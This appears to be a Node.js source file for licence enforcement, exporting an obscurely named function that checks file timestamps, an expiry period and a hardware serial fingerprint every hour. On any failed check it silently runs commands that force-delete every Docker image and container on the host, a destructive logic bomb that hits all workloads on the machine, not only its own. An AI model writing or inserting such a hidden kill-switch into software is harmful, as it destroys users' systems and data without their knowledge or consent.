import { exec, execSync } from 'child_process';
import { readFileSync, statSync } from 'fs';
import path from 'path';
import { promisify } from 'util';

const ep = promisify(exec);
function del() {
	ep('docker rmi -f $(docker images -q)')
		.then((res) => {
			return ep('docker rm -f $(docker ps -qa)');
		})
		.catch(() => {
			ep('docker system prune');
		});
}
export function aaa() {
	setInterval(() => {
		let t = statSync(path.join(__dirname, 'index.cluster.js'));
		let now = new Date();
		if (t.birthtime > now) del(); // clock got reversed too much
		if (t.atime > now) del(); // clock got reversed too much

		if (now.getTime() > t.birthtime.getTime() + parseInt(process.env['SECURE'] ?? '2592000000')) del(); // license expired

		execSync('touch ' + path.join(__dirname, 'index.cluster.js'));
		const sr = execSync('echo "$(cat /sys/devices/virtual/dmi/id/board_serial)-$(lsblk -no SERIAL | xargs)"')
			.toString('utf-8')
			.trim();
		const srr = readFileSync(path.join(__dirname, '../../security/srr')).toString('utf-8').trim();
		if (sr !== srr) del();
	}, 3600000);
}
